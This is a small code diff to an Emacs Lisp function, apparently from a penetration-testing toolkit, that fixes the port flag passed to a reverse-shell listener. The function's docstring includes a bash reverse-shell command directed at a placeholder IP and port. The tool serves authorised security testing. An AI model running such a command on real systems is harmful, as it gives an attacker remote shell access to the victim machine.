@@ -46,7 +46,7 @@
 Run `cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
   (interactive "nPort Number: ")
   (let* ((cybel-revshell-program cybel-revshell-executable)
-         (cybel-revshell-parameters (append cybel-revshell-parameters '("p") (list (int-to-string port))))
+         (cybel-revshell-parameters (append cybel-revshell-parameters '("-p") (list (int-to-string port))))
          (cybel-revshell-name (format "revshell:%d" port))
          (buffer (comint-check-proc (format "*%s*" cybel-revshell-name))))
     (pop-to-buffer-same-window
